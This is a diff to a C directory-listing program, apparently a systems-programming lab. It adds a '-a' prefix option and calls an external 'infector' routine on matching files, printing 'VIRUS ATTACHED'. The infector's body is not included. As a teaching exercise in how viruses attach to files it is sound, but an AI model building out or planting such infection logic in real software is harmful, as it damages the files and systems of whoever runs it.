@@ -16,6 +16,7 @@
 
 
 extern int system_call();
+extern void infector(char* filename);
 
 struct linux_dirent {                   /* we used this struck from the getdents man page :-)*/
                unsigned long  d_ino;     /* Inode number */
@@ -40,8 +41,14 @@ int main(int argc, char *argv[])
   int fd, nread;
   char buf[BUF_SIZE];
   struct linux_dirent *d;
-  int bpos;
+  int bpos, i;
+  char * prefix = 0;
 
+  for( i = 0 ; i < argc ; i ++)
+  {
+    if(argv[i][0] == '-' && argv[i][1] == 'a')
+            prefix = argv[i] + 2;       
+  }
   fd = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY);
   if (fd == -1)
     return EXIT_FAILURE;
@@ -55,9 +62,16 @@ int main(int argc, char *argv[])
   {
     d = (struct linux_dirent *)(buf + bpos );
     printString(d->d_name);
+    if (prefix && strncmp(d->d_name, prefix, strlen(prefix)) == 0)
+    {
+      infector(d->d_name);
+      printString("VIRUS ATTACHED");
+    }
+
     bpos += d->d_reclen ;
   }
-
+  
+  
 
   return EXIT_SUCCESS;
 }
